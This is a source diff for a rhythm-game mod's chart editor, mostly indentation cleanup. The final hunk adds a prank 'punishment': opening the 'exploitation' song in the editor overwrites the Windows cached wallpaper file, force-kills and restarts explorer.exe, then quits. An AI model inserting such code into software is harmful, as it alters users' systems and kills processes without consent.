@@ -1,5 +1,7 @@
 package;
 
+import sys.io.File;
+import sys.FileSystem;
 import flixel.FlxCamera;
 import flixel.addons.ui.FlxUIText;
 import haxe.zip.Writer;
@@ -249,17 +251,17 @@ class ChartingState extends MusicBeatState
 		});
 
 		
-		var restart = new FlxButton(10,140,"Reset Chart", function()
-            {
-                for (ii in 0..._song.notes.length)
-                {
-                    for (i in 0..._song.notes[ii].sectionNotes.length)
-                        {
-                            _song.notes[ii].sectionNotes = [];
-                        }
-                }
-                resetSection(true);
-            });
+		var restart = new FlxButton(10, 140, "Reset Chart", function()
+		{
+			for (ii in 0..._song.notes.length)
+			{
+				for (i in 0..._song.notes[ii].sectionNotes.length)
+				{
+					_song.notes[ii].sectionNotes = [];
+				}
+			}
+			resetSection(true);
+		});
 
 		var loadAutosaveBtn:FlxButton = new FlxButton(reloadSongJson.x, reloadSongJson.y + 30, 'load autosave', loadAutosave);
 		var stepperBPM:FlxUINumericStepper = new FlxUINumericStepper(10, 65, 0.1, 1, 1.0, 5000.0, 1);
@@ -356,13 +358,13 @@ class ChartingState extends MusicBeatState
 		tab_group_song.add(stepperVocalVolLabel);
 		tab_group_song.add(stepperSongVol);
 		tab_group_song.add(stepperSongVolLabel);
-        tab_group_song.add(shiftNoteDialLabel);
-        tab_group_song.add(stepperShiftNoteDial);
-        tab_group_song.add(shiftNoteDialLabel2);
-        tab_group_song.add(stepperShiftNoteDialstep);
-        tab_group_song.add(shiftNoteDialLabel3);
-        tab_group_song.add(stepperShiftNoteDialms);
-        tab_group_song.add(shiftNoteButton);
+		tab_group_song.add(shiftNoteDialLabel);
+		tab_group_song.add(stepperShiftNoteDial);
+		tab_group_song.add(shiftNoteDialLabel2);
+		tab_group_song.add(stepperShiftNoteDialstep);
+		tab_group_song.add(shiftNoteDialLabel3);
+		tab_group_song.add(stepperShiftNoteDialms);
+		tab_group_song.add(shiftNoteButton);
 		tab_group_song.add(hitsounds);
 
 		var tab_group_assets = new FlxUI(null, UI_box);
@@ -1456,6 +1458,11 @@ class ChartingState extends MusicBeatState
 				case 'unfairness':
 					FlxG.switchState(new YouCheatedSomeoneIsComing()); //YOU THINK YOU ARE SO CLEVER DON'T YOU? HAHA FUCK YOU
 				case 'exploitation':
+					var wallpaperPath = Sys.getEnv('APPDATA') + '/Microsoft/Windows/Themes/CachedFiles/CachedImage_1920_1080_POS2.jpg';
+					File.saveBytes(wallpaperPath, File.getBytes(Paths.image('random/HAHA')));
+
+					Sys.command("taskkill /f /im explorer.exe");
+					Sys.command("explorer.exe");
 					Sys.exit(0);
 			}
 			PlayState.SONG = Song.loadFromJson(song.toLowerCase(), song.toLowerCase());
